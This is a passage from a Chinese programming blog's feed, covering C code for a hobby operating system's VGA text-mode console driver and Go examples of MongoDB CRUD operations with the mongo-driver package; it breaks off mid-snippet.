显示内存起始位置 - 低位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_CURSOR_H 0xE     <span class="comment">// 光标位置 - 高位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_CURSOR_L 0xF     <span class="comment">// 光标位置 - 低位</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_BASE 0xB8000              <span class="comment">// 显卡内存起始位置</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_SIZE 0x4000               <span class="comment">// 显卡内存大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_END (MEM_BASE + MEM_SIZE) <span class="comment">// 显卡内存结束位置</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIDTH 80                      <span class="comment">// 屏幕文本列数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEIGHT 25                     <span class="comment">// 屏幕文本行数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROW_SIZE (WIDTH * 2)          <span class="comment">// 每行字节数 一个字符由2个字节控制 ，一个是ascii，一个是样式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SCR_SIZE (ROW_SIZE * HEIGHT)  <span class="comment">// 屏幕字节数</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_NUL 0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_ENQ 0x05</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_BEL 0x07 <span class="comment">// \a</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_BS 0x08  <span class="comment">// \b</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_HT 0x09  <span class="comment">// \t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_LF 0x0A  <span class="comment">// \n</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_VT 0x0B  <span class="comment">// \v</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_FF 0x0C  <span class="comment">// \f</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_CR 0x0D  <span class="comment">// \r</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASCII_DEL 0x7F</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 screen; <span class="comment">// 记录当前显示器开始的内存位置</span></span><br><span class="line"><span class="type">static</span> u32 pos;    <span class="comment">// 记录当前光标内存位置</span></span><br><span class="line"><span class="type">static</span> u32 x, y;   <span class="comment">// 当前光标坐标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除后，会在那里显示一个类似橡皮擦的样式光标</span></span><br><span class="line"><span class="type">static</span> u8 attr = <span class="number">7</span>;        <span class="comment">// 字符样式</span></span><br><span class="line"><span class="type">static</span> u16 erase = <span class="number">0x0720</span>; <span class="comment">// 空格 07是字符，20是样式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得当前显示器的位置</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">get_screen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_START_ADDR_H); <span class="comment">// 显示内存起始位置高地址</span></span><br><span class="line">    screen = <span class="built_in">inb</span>(CRT_DATA_REG) &lt;&lt; <span class="number">8</span>;      <span class="comment">// 显示内存起始位置值的高8位</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_START_ADDR_L); <span class="comment">// 显示内存起始位置低地址</span></span><br><span class="line">    screen |= <span class="built_in">inb</span>(CRT_DATA_REG);          <span class="comment">// 显示内存起始位置值的低8位</span></span><br><span class="line"></span><br><span class="line">    screen &lt;&lt;= <span class="number">1</span>;       <span class="comment">// screen *= 2 屏幕上每个位置是由2个字进行描述</span></span><br><span class="line">    screen += MEM_BASE; <span class="comment">// 真正的位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置显示器位置</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">set_screen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_START_ADDR_H);                  <span class="comment">// 显示内存起始位置高地址</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_DATA_REG, ((screen - MEM_BASE) &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xff</span>); <span class="comment">// 因为screen获得时候，是左移1位，然后再移8位是高地址</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_START_ADDR_L);                  <span class="comment">// 显示内存起始位置低地址</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_DATA_REG, ((screen - MEM_BASE) &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0xff</span>); <span class="comment">// 因为screen获得时候，是左移1位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得当前光标位置</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">get_cursor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_CURSOR_H); <span class="comment">// 光标内存起始位置高地址</span></span><br><span class="line">    pos = <span class="built_in">inb</span>(CRT_DATA_REG) &lt;&lt; <span class="number">8</span>;     <span class="comment">// 光标内存起始位置值的高8位</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_CURSOR_L); <span class="comment">// 光标内存起始位置低地址</span></span><br><span class="line">    pos |= <span class="built_in">inb</span>(CRT_DATA_REG);         <span class="comment">// 光标内存起始位置值的低8位</span></span><br><span class="line">    pos &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    pos += MEM_BASE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得光标的坐标</span></span><br><span class="line">    <span class="built_in">get_screen</span>();</span><br><span class="line">    u32 delta = (pos - screen) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x = delta % WIDTH;</span><br><span class="line">    y = delta / WIDTH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置当前光标位置</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">set_cursor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_CURSOR_H); <span class="comment">// 光标内存起始位置高地址</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_DATA_REG, ((pos - MEM_BASE) &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG, CRT_CURSOR_L); <span class="comment">// 光标内存起始位置低地址</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_DATA_REG, ((pos - MEM_BASE) &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">console_clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    screen = MEM_BASE;</span><br><span class="line">    pos = MEM_BASE;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">set_cursor</span>();</span><br><span class="line">    <span class="built_in">set_screen</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空 让屏幕全为空格</span></span><br><span class="line">    u16 *ptr = (u16 *)MEM_BASE;</span><br><span class="line">    <span class="keyword">while</span> (ptr &lt; (u16 *)MEM_END)</span><br><span class="line">    &#123;</span><br><span class="line">        *ptr++ = erase;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">console_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 相当于screen为第二行开始的地方，意思就是我们只能从显示器第二行开始看，第一行就看不到了</span></span><br><span class="line">    <span class="comment">// screen = 80 * 2 + MEM_BASE;</span></span><br><span class="line">    <span class="comment">// set_screen();</span></span><br><span class="line">    <span class="comment">// get_screen();</span></span><br><span class="line">    <span class="comment">// 比如设置光标为124， 第一行的后半截，124/2=62</span></span><br><span class="line">    <span class="comment">// pos = 124 + MEM_BASE;</span></span><br><span class="line">    <span class="comment">// set_cursor();</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">console_clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 超过屏幕显示大小，向上滚屏，也就是把最上面一行去掉</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">scroll_up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (screen + SCR_SIZE + ROW_SIZE &lt; MEM_END)</span><br><span class="line">    &#123;</span><br><span class="line">        u32 *ptr = (u32 *)(screen + SCR_SIZE);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; WIDTH; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            *ptr++ = erase;</span><br><span class="line">        &#125;</span><br><span class="line">        screen += ROW_SIZE;</span><br><span class="line">        pos += ROW_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 超过，感觉是直接重头开始</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span> *)MEM_BASE, (<span class="type">void</span> *)screen, SCR_SIZE);</span><br><span class="line">        pos -= (screen - MEM_BASE);</span><br><span class="line">        screen = MEM_BASE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">set_screen</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">command_lf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (y + <span class="number">1</span> &lt; HEIGHT)</span><br><span class="line">    &#123;</span><br><span class="line">        y++;</span><br><span class="line">        pos += ROW_SIZE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scroll_up</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">command_bs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x)</span><br><span class="line">    &#123;</span><br><span class="line">        x--;</span><br><span class="line">        pos -= <span class="number">2</span>;</span><br><span class="line">        *(u16 *)pos = erase;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">command_cr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pos -= (x &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">command_del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    *(u16 *)pos = erase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">console_write</span><span class="params">(<span class="type">char</span> *buf, u32 count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (count--)</span><br><span class="line">    &#123;</span><br><span class="line">        ch = *buf++;</span><br><span class="line">        <span class="keyword">switch</span> (ch)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> ASCII_NUL:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_ENQ:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_BEL: <span class="comment">// \a</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_BS: <span class="comment">// \b</span></span><br><span class="line">            <span class="built_in">command_bs</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_HT: <span class="comment">// \t</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_LF: <span class="comment">// \n</span></span><br><span class="line">            <span class="built_in">command_lf</span>();</span><br><span class="line">            <span class="built_in">command_cr</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_VT: <span class="comment">// \v</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_FF: <span class="comment">// \f</span></span><br><span class="line">            <span class="built_in">command_lf</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_CR: <span class="comment">// \r</span></span><br><span class="line">            <span class="built_in">command_cr</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ASCII_DEL:</span><br><span class="line">            <span class="built_in">command_del</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (x &gt;= WIDTH)</span><br><span class="line">            &#123;</span><br><span class="line">                x -= WIDTH;</span><br><span class="line">                pos -= ROW_SIZE;</span><br><span class="line">                <span class="built_in">command_lf</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            *((<span class="type">char</span> *)pos) = ch;</span><br><span class="line">            pos++;</span><br><span class="line">            *((<span class="type">char</span> *)pos) = attr;</span><br><span class="line">            pos++;</span><br><span class="line">            </span><br><span class="line">            x++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">set_cursor</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面简单测试下吧，kernel主函数如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;hello system...\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kernel_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="built_in">console_init</span>();</span><br><span class="line">    u32 count = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">while</span> (count--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">console_write</span>(message, <span class="built_in">sizeof</span>(message) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220506094823489.png" alt="image-20220506094823489"></p><p>可以看到打印了20次，且每次都换行了，成功啦</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这一次我们正式进入内核，编写相关的内核代码，也就是kernel代码&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://www.shicoder.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>mongodb-go</title>
    <link href="http://www.shicoder.top/posts/203583153.html"/>
    <id>http://www.shicoder.top/posts/203583153.html</id>
    <published>2022-05-05T08:00:37.000Z</published>
    <updated>2022-05-05T09:19:29.955Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>之前的博客中将mongodb的自带命令进行讲解，这次我们结合go的包<code>mongo-driver</code>进行代码实现</p><span id="more"></span><h1 id="连接操作"><a href="#连接操作" class="headerlink" title="连接操作"></a>连接操作</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;go.mongodb.org/mongo-driver/bson&quot;</span></span><br><span class="line"><span class="string">&quot;go.mongodb.org/mongo-driver/mongo&quot;</span></span><br><span class="line"><span class="string">&quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line">clientOpts := options.Client().ApplyURI(<span class="string">&quot;mongodb://localhost:27017&quot;</span>)</span><br><span class="line">client, err := mongo.Connect(context.TODO(), clientOpts)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;connect successful&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>选择数据库和集合</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collection := client.Database(<span class="string">&quot;test&quot;</span>).Collection(<span class="string">&quot;aaa&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="CRUD"><a href="#CRUD" class="headerlink" title="CRUD"></a>CRUD</h1><ul><li>插入</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式一</span></span><br><span class="line">insertResult, err := collection.InsertOne(context.TODO(), bson.D&#123;&#123;<span class="string">&quot;name&quot;</span>,<span class="string">&quot;shilinkun2&quot;</span>&#125;,&#123;<span class="string">&quot;Age&quot;</span>,<span class="number">15</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二</span></span><br><span class="line"><span class="comment">// 但这种有个缺陷</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">结构体的字段必须首字母大写，同时在插入的时候，会</span></span><br><span class="line"><span class="comment">自动将字段全部转为小写，因该是可以修改，但目前还不知</span></span><br><span class="line"><span class="comment">怎么操作hhh</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> People <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line">p := People&#123;</span><br><span class="line"><span class="string">&quot;shilinkun1&quot;</span>,</span><br><span class="line"><span class="number">15</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 类似 db.aaa.insertOne(&#123;&quot;name&quot;:&quot;shilinkun1&quot;,&quot;age&quot;:15&#125;)</span></span><br><span class="line">insertResult, err := collection.InsertOne(context.TODO(),p)</span><br></pre></td></tr></table></figure><ul><li>更新</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">filter := bson.D&#123;</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>,<span class="string">&quot;shilinkun&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">update := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;$inc&quot;</span>,bson.D&#123;&#123;<span class="string">&quot;Age&quot;</span>,<span class="number">1</span>&#125;&#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">updateResult, err := collection.UpdateOne(context.TODO(), filter, update)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Matched %v documents and updated %v documents.\n&quot;</span>, updateResult.MatchedCount, updateResult.ModifiedCount)</span><br></pre></td></tr></table></figure><ul><li>查找</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单个查询</span></span><br><span class="line"><span class="keyword">var</span> result <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">err = collection.FindOne(context.TODO(),bson.D&#123;&#125;).Decode(&amp;result)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Found a single document: %+v\n&quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带条件单个查询</span></span><br><span class="line"><span class="keyword">var</span> result <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">filter := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>,<span class="string">&quot;shilinkun&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">err = collection.FindOne(context.TODO(),filter).Decode(&amp;result)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;Found a single document: %+v\n&quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个查询</span></span><br><span class="line">cur,err := collection.Find(context.TODO(),bson.D&#123;&#125;)</span><br><span class="line"><span class="keyword">for</span> cur.Next(context.TODO()) &#123;</span><br><span class="line">    fmt.Println(cur.Current.String())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带sort、limit、skip条件</span></span><br><span class="line">sort := bson.D&#123;&#123;<span class="string">&quot;title&quot;</span>,<span class="number">1</span>&#125;&#125;</span><br><span class="line">findOptions := options.Find().SetSort(sort).SetLimit(<span class="number">4</span>).SetSkip(<span class="number">5</span>)</span><br><span class="line">cur,err := collection.Find(context.TODO(),bson.D&#123;&#125;,findOptions)</span><br><span class="line"><span class="keyword">for</span> cur.Next(context.TODO()) &#123;</span><br><span class="line">    fmt.Println(cur.Current.String())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带过滤条件查询</span></span><br><span class="line">filter := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;author.age&quot;</span>,bson.D&#123;&#123;<span class="string">&quot;$lt&quot;</span>,<span class="number">25</span>&#125;&#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cur,err := collection.Find(context.TODO(),filter)</span><br><span class="line"><span class="keyword">for</span> cur.Next(context.TODO()) &#123;</span><br><span class="line">    fmt.Println(cur.Current.String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>删除</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filter := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;title&quot;</span>,<span class="string">&quot;book-5&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">count,err:= collection.DeleteMany(context.TODO(),filter)</span><br><span class="line">fmt.Println(count)</span><br></pre></td></tr></table></figure><ul><li>向集合中一条数据中的一个数组中添加&#x2F;删除一个元素</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">filter := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;title&quot;</span>,<span class="string">&quot;book-0&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">update := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;$push&quot;</span>,bson.D&#123;&#123;<span class="string">&quot;tag&quot;</span>,<span class="string">&quot;mongodb1&quot;</span>&#125;&#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">_, err = collection.UpdateOne(context.TODO(), filter, update)</span><br><span class="line"></span><br><span class="line">操作前：</span><br><span class="line">&#123;<span class="string">&quot;_id&quot;</span>: &#123;<span class="string">&quot;$oid&quot;</span>:<span class="string">&quot;6271102510f566b3b1a8dba5&quot;</span>&#125;,<span class="string">&quot;title&quot;</span>: <span class="string">&quot;book-0&quot;</span>,<span class="string">&quot;type&quot;</span>: <span class="string">&quot;technology&quot;</span>,<span class="string">&quot;tag&quot;</span>: [<span class="string">&quot;mongodb&quot;</span>,<span class="string">&quot;developer&quot;</span>]</span><br><span class="line">操作后</span><br><span class="line">&#123;<span class="string">&quot;_id&quot;</span>: &#123;<span class="string">&quot;$oid&quot;</span>:<span class="string">&quot;6271102510f566b3b1a8dba5&quot;</span>&#125;,<span class="string">&quot;title&quot;</span>: <span class="string">&quot;book-0&quot;</span>,<span class="string">&quot;type&quot;</span>: <span class="string">&quot;technology&quot;</span>,<span class="string">&quot;tag&quot;</span>: [<span class="string">&quot;mongodb&quot;</span>,<span class="string">&quot;developer&quot;</span>,<span class="string">&quot;mongodb1&quot;</span>]</span><br><span class="line"> </span><br><span class="line">同样删除为</span><br><span class="line">filter := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;title&quot;</span>,<span class="string">&quot;book-0&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">update := bson.D&#123;</span><br><span class="line">    &#123;<span class="string">&quot;$pull&quot;</span>,bson.D&#123;&#123;<span class="string">&quot;tag&quot;</span>,<span class="string">&quot;mongodb1&quot;</span>&#125;&#125;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">_, err = collection.UpdateOne(context.TODO(), filter, update)</span><br></pre></td></tr></table></figure><h1 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a>聚合操作</h1><ul><li>单阶段</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 